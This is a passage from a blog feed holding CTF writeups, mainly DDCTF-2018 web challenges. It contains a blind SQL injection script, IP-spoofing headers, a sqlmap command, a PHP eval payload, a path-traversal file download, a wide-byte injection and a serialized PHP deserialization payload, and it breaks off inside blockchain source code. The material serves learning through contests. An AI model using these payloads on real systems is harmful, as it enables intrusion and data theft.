class="line">key1=<span class="string">"do_you_know_des3"</span></div><div class="line">obj1=DES3.new(key1,DES3.MODE_ECB)</div><div class="line">s1=obj1.encrypt(flag)</div><div class="line"></div><div class="line">key2=<span class="string">"and_you_know_aes"</span></div><div class="line">iv=md5(key2).digest()</div><div class="line">obj2=AES.new(key2,AES.MODE_CBC,iv)</div><div class="line">s2=obj2.encrypt(s1)</div><div class="line"><span class="keyword">with</span> open(<span class="string">"flag.enc"</span>,<span class="string">"wb"</span>) <span class="keyword">as</span> f:</div><div class="line">f.write(s2)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">()</span>:</span></div><div class="line">s1=open(<span class="string">"flag.enc"</span>,<span class="string">"rb"</span>).read()</div><div class="line"></div><div class="line">key2=<span class="string">"and_you_know_aes"</span></div><div class="line">iv=md5(key2).digest()</div><div class="line">obj2=AES.new(key2,AES.MODE_CBC,iv)</div><div class="line">s2=obj2.decrypt(s1)</div><div class="line"></div><div class="line"></div><div class="line">key1=<span class="string">"do_you_know_des3"</span></div><div class="line">obj1=DES3.new(key1,DES3.MODE_ECB)</div><div class="line">flag=obj1.decrypt(s2)</div><div class="line"></div><div class="line"><span class="keyword">print</span> flag</div><div class="line"></div><div class="line"></div><div class="line">decrypt()</div></pre></td></tr></table></figure><h2 id="crypt2"><a href="#crypt2" class="headerlink" title="crypt2"></a>crypt2</h2><p>Coppersmith攻击了解一下。</p><h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>静态编译，ROPgadget了解一下。</p><h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><p>根据0ctf2018 babyheap改的题，把off by one改没了，不知道怎么做= =</p><h2 id="web1-web7"><a href="#web1-web7" class="headerlink" title="web1-web7"></a>web1-web7</h2><p>全是原题，不会做的话，实验吧刷题了解一下。</p><h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>有waf的报错注入，waf只是为了限制考点，很容易绕过</p><h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><p>格式化字符串，sqlmap了解一下</p><p><code>sqlmap -r post -p username --prefix &quot;%1$&#39;&quot; --suffix &quot;#&quot; -v3 --technique=T -D ctf -T flag --dump</code></p><h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>命令执行，rctf原题改，getallheaders被禁用了，但是apache_request_headers可以</p><p>payload为<code>eval(next(apache_request_headers()));</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;706测试的题目，wp简单写下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="writeup" scheme="https://winter3un.github.io/tags/writeup/"/>
    
      <category term="ctf" scheme="https://winter3un.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>DDCTF-2018  WEB WRITEUP</title>
    <link href="https://winter3un.github.io/2018/04/19/ddctf-2018/"/>
    <id>https://winter3un.github.io/2018/04/19/ddctf-2018/</id>
    <published>2018-04-20T05:44:11.000Z</published>
    <updated>2018-04-20T05:48:49.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>工作需要较强的web安全能力，所以我想通过打ctf的web类题目来提高这方面的水平，以下为这次didictf web类的题解。</p><a id="more"></a><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><img src="/2018/04/19/ddctf-2018/1.png" alt="1.png" title=""><p>非法链接的问题，直接在http头中加入以下键值对绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">X-Originating-IP: 123.232.23.245</div><div class="line">X-Forwarded-For: 123.232.23.245</div><div class="line">X-Remote-IP: 123.232.23.245</div><div class="line">X-Remote-Addr: 123.232.23.245</div></pre></td></tr></table></figure></p><p>其实也可以配置burp的插件bypass waf（<a href="https://www.codewatch.org/blog/?p=408" target="_blank" rel="external">https://www.codewatch.org/blog/?p=408</a> ） ，来绕过限制正常在客户端浏览。</p><img src="/2018/04/19/ddctf-2018/2.png" alt="2.png" title=""><p>emmm…明显考察注入，不过这边的注入点比较隐蔽，在<code>author</code>参数这儿，页面上隐藏了输入点，我们可以直接写python脚本通过盲注的手法跑出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"></div><div class="line">s = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> index <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">0x20</span>):</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x30</span>,<span class="number">0x7f</span>):</div><div class="line">id = <span class="string">""</span></div><div class="line">title = <span class="string">""</span></div><div class="line">date = <span class="string">""</span></div><div class="line">author = <span class="string">"-1'||if(ord(substr((select secvalue from ctf_key9 limit 0,1),"</span>+str(index)+<span class="string">",1))="</span>+str(i)+<span class="string">",0,1)#"</span></div><div class="line"></div><div class="line"><span class="comment"># select * from content where id = ? and author = ' -1' ||  ' and date = ' = 'a' union '   </span></div><div class="line"></div><div class="line">proxies = &#123;<span class="string">"http"</span>:<span class="string">"127.0.0.1:8080"</span>&#125;</div><div class="line"></div><div class="line">data = &#123; <span class="string">"id"</span>:id,</div><div class="line"><span class="string">"title"</span>:title,</div><div class="line"><span class="string">"author"</span>:author,</div><div class="line"><span class="string">"data"</span>:date,</div><div class="line"><span class="string">"button"</span>:<span class="string">"search"</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">t = str(int(time.time()))</div><div class="line"></div><div class="line">str0 = <span class="string">'id='</span>+id+<span class="string">'title='</span>+title+<span class="string">'author='</span>+author+<span class="string">'date='</span>+date+<span class="string">'time='</span>+t+<span class="string">'adrefkfweodfsdpiru'</span></div><div class="line"></div><div class="line"></div><div class="line">sig = hashlib.sha1(str0).hexdigest()</div><div class="line"></div><div class="line"></div><div class="line">ip = <span class="string">'123.232.23.245'</span></div><div class="line"></div><div class="line">headers  = &#123;<span class="string">'X-Originating-IP'</span>: ip,</div><div class="line"><span class="string">'X-Forwarded-For'</span>: ip,</div><div class="line"><span class="string">'X-Remote-IP'</span>: ip,</div><div class="line"><span class="string">'X-Remote-Addr'</span>: ip,</div><div class="line"><span class="string">'X-Client-IP'</span>: ip,</div><div class="line"><span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"</span>,</div><div class="line"><span class="string">'Referer'</span>:<span class="string">"http://123.232.23.245/"</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> len(requests.post(url=<span class="string">"http://116.85.43.88:8080/NQYPTEMNWRQIYLEP/dfe3ia/index.php?sig="</span>+sig+<span class="string">"&amp;time="</span>+str(int(time.time())),data=data,headers=headers,proxies=proxies).content) != <span class="number">2420</span>:</div><div class="line">s += chr(i)</div><div class="line"><span class="keyword">break</span></div><div class="line"><span class="keyword">print</span> s</div><div class="line"><span class="comment"># print str0</span></div></pre></td></tr></table></figure><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>web2的难度明显要比web1要高。</p><p>点击链接进去后，直接<code>ctrl+u</code>看源码，发现了可疑的链接<br><img src="/2018/04/19/ddctf-2018/3.png" alt="3.png" title=""></p><p>将<code>ZmF2aWNvbi5pY28=</code> base64解码后，发现是<code>favicon.ico</code> ，初步判断该<code>api</code>应该存在任意文件下载漏洞。</p><p>接下来通过构造<code>web.xml</code>的地址(<code>../../WEB-INF/web.xml</code> —base64&gt;&gt;&gt; <code>Li4vLi4vV0VCLUlORi93ZWIueG1s</code>)，并利用该漏洞，下载该配置文件。</p><p>下载完了以后分析该<code>web.xml</code>文件，在文件内发现其他关联的文件，仿照上一步操作，将所有相关的文件都下载到本地分析。</p><p>在<code>web.xml</code>中发现该<code>class</code>文件</p><img src="/2018/04/19/ddctf-2018/4.png" alt="4.png" title=""><p>下载至本地后，用<code>GD-GUI</code>分析发现为<code>flag</code>的加密算法</p><img src="/2018/04/19/ddctf-2018/5.png" alt="5.png" title=""><p>但是我们缺少关键的<code>email</code>和<code>flag</code>密文，继续寻找相关文件，开了下脑洞，猜测控制器文件<code>FlagController.class</code>,没想到真的有233333 下载下来分析。如图，只要我们给<code>email</code>就给我们加密后的<code>flag</code> 233333 </p><img src="/2018/04/19/ddctf-2018/6.png" alt="6.png" title=""><p>回到首页，发现<code>email</code>。。。</p><img src="/2018/04/19/ddctf-2018/7.png" alt="7.png" title=""><p>所有条件都齐全了，逆向算法，最后写出了对应的解密脚本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> java.io.File;</div><div class="line"><span class="keyword">import</span> java.io.FileInputStream;</div><div class="line"><span class="keyword">import</span> java.io.IOException;</div><div class="line"><span class="keyword">import</span> java.io.InputStream;</div><div class="line"><span class="keyword">import</span> java.io.PrintStream;</div><div class="line"><span class="keyword">import</span> java.security.InvalidKeyException;</div><div class="line"><span class="keyword">import</span> java.security.Key;</div><div class="line"><span class="keyword">import</span> java.security.KeyStore;</div><div class="line"><span class="keyword">import</span> java.security.PublicKey;  </div><div class="line"><span class="keyword">import</span> java.security.KeyStoreException;</div><div class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</div><div class="line"><span class="keyword">import</span> java.security.SecureRandom;</div><div class="line"><span class="keyword">import</span> java.security.UnrecoverableKeyException;</div><div class="line"><span class="keyword">import</span> java.security.cert.CertificateException;</div><div class="line"><span class="keyword">import</span> java.util.Properties;</div><div class="line"><span class="keyword">import</span> java.util.UUID;</div><div class="line"><span class="keyword">import</span> javax.crypto.BadPaddingException;</div><div class="line"><span class="keyword">import</span> javax.crypto.Cipher;</div><div class="line"><span class="keyword">import</span> javax.crypto.IllegalBlockSizeException;</div><div class="line"><span class="keyword">import</span> javax.crypto.Mac;</div><div class="line"><span class="keyword">import</span> javax.crypto.NoSuchPaddingException;</div><div class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</div><div class="line"><span class="keyword">import</span> sun.misc.BASE64Decoder;  </div><div class="line"><span class="keyword">import</span> sun.misc.BASE64Encoder;  </div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">decrypt</span></span></div><div class="line">&#123;</div><div class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] decryptBASE64(String key) <span class="keyword">throws</span> Exception &#123;  </div><div class="line">        <span class="keyword">return</span> (<span class="keyword">new</span> BASE64Decoder()).decodeBuffer(key);  </div><div class="line">    &#125;  </div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span></div><div class="line">&#123;</div><div class="line"><span class="keyword">try</span>&#123;</div><div class="line">KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());</div><div class="line">FileInputStream inputStream = <span class="keyword">new</span> FileInputStream(<span class="string">"C:\\Users\\Administrator\\Desktop\\ddctf\\web2\\key\\sdl.ks"</span>);</div><div class="line">keyStore.load(inputStream, <span class="string">"sdl welcome you !"</span>.substring(<span class="number">0</span>, <span class="string">"sdl welcome you !"</span>.length() - <span class="number">1</span>).trim().replace(<span class="string">" "</span>, <span class="string">""</span>).toCharArray());</div><div class="line"></div><div class="line">PublicKey key = keyStore.getCertificate(<span class="string">"www.didichuxing.com"</span>).getPublicKey();  </div><div class="line">System.out.println(key);</div><div class="line">Cipher cipher = Cipher.getInstance(key.getAlgorithm());</div><div class="line">cipher.init(<span class="number">2</span>, key); </div><div class="line"></div><div class="line"><span class="keyword">byte</span>[] text = decryptBASE64(<span class="string">"S1EgULNQ7TlSYnuzagfIe5gfmjYWZRJE7YBSKoaOGmYZ6yjkmbapuNDyQDiUyjV2mKDGm2hnhkgwA6l0qsdvD9uSOjStWMHHYerOZGvk8epWSQ8YYn2pWArUlV7m2e4nV6oqKYYXRMJVO8776JX00OY/MmUeaj6XoAHk4cWar3BpwAfLw3hsUYDM1NoVjBkPy/SS/DHDhf9YsM+3kF3hNmyUc7tqTvvb/1gzovigpmoAIzc8FDxeaBprG+084bkoIiMlBs8cUyUyZq4x7PD6jvVkb00kHUeVERPFIVxlbS1ph4jS+Wy6yd3GNaYe0wUUwoxd/5MiSG4Z4l4miFX8SQ=="</span>);</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">byte</span>[] doFinal = cipher.doFinal(text); </div><div class="line"></div><div class="line"></div><div class="line">System.out.println(byte2hex(doFinal));</div><div class="line">&#125;</div><div class="line"><span class="keyword">catch</span>(Exception e)</div><div class="line">&#123;</div><div class="line">System.out.println(<span class="string">"e:"</span>+e);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">byte2hex</span><span class="params">(<span class="keyword">byte</span>[] b)</span></span></div><div class="line">  &#123;</div><div class="line">    StringBuilder hs = <span class="keyword">new</span> StringBuilder();</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> n = <span class="number">0</span>; (b != <span class="keyword">null</span>) &amp;&amp; (n &lt; b.length); n++)</div><div class="line">    &#123;</div><div class="line">      String stmp = Integer.toHexString(b[n] &amp; <span class="number">0xFF</span>);</div><div class="line">      <span class="keyword">if</span> (stmp.length() == <span class="number">1</span>) &#123;</div><div class="line">        hs.append(<span class="string">'0'</span>);</div><div class="line">      &#125;</div><div class="line">      hs.append(stmp);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> hs.toString().toUpperCase();</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>一开始以为是宽字节注入，试了很多方式都没试出来，突然看到了提示，如图，链接过去是一篇关于big编码说明的文件。。。</p><img src="/2018/04/19/ddctf-2018/8.png" alt="8.png" title=""><p>那思路很明确了，找一个big编码的字，第二位字节为 <code>0x5c</code> 即 <code>\</code> 转义掉gpc生成的 <code>\</code> 最后成功逃逸单引号 <code>\\&#39;</code></p><img src="/2018/04/19/ddctf-2018/9.png" alt="9.png" title=""><p>接下来就是常规注入了，注入完毕后发现，并没有flag。。。只有一个备份文件。。。算了，下载下来备份文件代码审计吧。</p><img src="/2018/04/19/ddctf-2018/10.png" alt="10.png" title=""><p>发现竟然有个<code>api</code> 接受一个字符串并反序列，直接就get到了考点，<strong>构造反序列化执行链，获取flag</strong></p><img src="/2018/04/19/ddctf-2018/11.png" alt="11.png" title=""><p>这个反序列执行链很简单</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">public</span> $sql;</div><div class="line"></div><div class="line">    <span class="comment">//</span></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;sql=<span class="keyword">new</span> SQL();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">SQL</span></span></div><div class="line">&#123;</div><div class="line">    </div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">FlagGet</span><span class="params">($user)</span></span></div><div class="line">    &#123;</div><div class="line">      <span class="keyword">return</span> <span class="string">""</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></div><div class="line">&#123;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> $user_uuid;</div><div class="line">    <span class="keyword">public</span> $fl;</div><div class="line"></div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">$t =  <span class="keyword">new</span> Test();</div><div class="line">$t-&gt;fl = <span class="keyword">new</span> Flag();</div><div class="line">$t-&gt;user_uuid = <span class="string">"c09764a2-8d31-4643-907a-5d663b9348dc"</span>;</div><div class="line"></div><div class="line"><span class="keyword">echo</span> serialize($t);</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>生成 <code>O:4:&quot;Test&quot;:2:{s:9:&quot;user_uuid&quot;;s:36:&quot;c09764a2-8d31-4643-907a-5d663b9348dc&quot;;s:2:&quot;fl&quot;;O:4:&quot;Flag&quot;:1:{s:3:&quot;sql&quot;;O:3:&quot;SQL&quot;:0:{}}}</code> 不过要把类名称改成<code>&quot;Index\Helper\Flag&quot;, &quot;Index\Helper\SQL&quot;,&quot;Index\Helper\Test&quot;</code>这种形式才能在远程环境执行。<br>最后的payload为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:17:&quot;Index\Helper\Test&quot;:2:&#123;s:9:&quot;user_uuid&quot;;s:36:&quot;c09764a2-8d31-4643-907a-5d663b9348dc&quot;;s:2:&quot;fl&quot;;O:17:&quot;Index\Helper\Flag&quot;:1:&#123;s:3:&quot;sql&quot;;O:16:&quot;Index\Helper\SQL&quot;:0:&#123;&#125;&#125;&#125;</div></pre></td></tr></table></figure><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>有关于区块链的代码审计，也是第一次接触到区块链的具体原理，分析了一天，收获蛮大的，这边其实可以利用<strong>区块链分叉攻击</strong>来实现bank未被hack掉的区块链链路（只要这个链路比被hack掉的链路长就可以了。）</p><p>mini区块链源码如下（对学习区块链还是挺有意思）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div><div class="line">297</div><div class="line">298</div><div class="line">299</div><div class="line">300</div><div class="line">301</div><div class="line">302</div><div class="line">303</div><div class="line">304</div><div class="line">305</div><div class="line">306</div><div class="line">307</div><div class="line">308</div><div class="line">309</div><div class="line">310</div><div class="line">311</div><div class="line">312</div><div class="line">313</div><div class="line">314</div><div class="line">315</div><div class="line">316</div><div class="line">317</div><div class="line">318</div><div class="line">319</div><div class="line">320</div><div class="line">321</div><div class="line">322</div><div class="line">323</div><div class="line">324</div><div class="line">325</div><div class="line">326</div><div class="line">327</div><div class="line">328</div><div class="line">329</div><div class="line">330</div><div class="line">331</div><div class="line">332</div><div class="line">333</div><div class="line">334</div><div class="line">335</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></div><div class="line"><span class="comment"># written in python 2.7</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> hashlib, json, rsa, uuid</div><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, redirect, url_for, escape, request</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">app = Flask(__name__)</div><div class="line">app.secret_key = <span class="string">'*********************'</span></div><div class="line">url_prefix = <span class="string">'/b9744af30897e'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> <span class="string">'Here is your flag: DDCTF&#123;******************&#125;'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash</span><span class="params">(x)</span>:</span></div><div class="line">    <span class="keyword">return</span> hashlib.sha256(hashlib.md5(x).digest()).hexdigest()</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_reducer</span><span class="params">(x, y)</span>:</span></div><div class="line">    <span class="keyword">return</span> hash(hash(x)+hash(y))</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">has_attrs</span><span class="params">(d, attrs)</span>:</span></div><div class="line">    <span class="keyword">if</span> type(d) != type(&#123;&#125;): <span class="keyword">raise</span> Exception(<span class="string">"Input should be a dict/JSON"</span>)</div><div class="line">    <span class="keyword">for</span> attr <span class="keyword">in</span> attrs:</div><div class="line">        <span class="keyword">if</span> attr <span class="keyword">not</span> <span class="keyword">in</span> d:</div><div class="line">            <span class="keyword">raise</span> Exception(<span class="string">"&#123;&#125; should be presented in the input"</span>.format(attr))</div><div class="line"></div><div class="line">EMPTY_HASH = <span class="string">'0'</span>*<span class="number">64</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">addr_to_pubkey</span><span class="params">(address)</span>:</span></div><div class="line">    <span class="keyword">return</span> rsa.PublicKey(int(address, <span class="number">16</span>), <span class="number">65537</span>)</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">pubkey_to_address</span><span class="params">(pubkey)</span>:</span></div><div class="line">    <span class="keyword">assert</span> pubkey.e == <span class="number">65537</span></div><div class="line">    hexed = hex(pubkey.n)</div><div class="line">    <span class="keyword">if</span> hexed.endswith(<span class="string">'L'</span>): hexed = hexed[:<span class="number">-1</span>]</div><div class="line">    <span class="keyword">if</span> hexed.startswith(<span class="string">'0x'</span>): hexed = hexed[<span class="number">2</span>:]</div><div 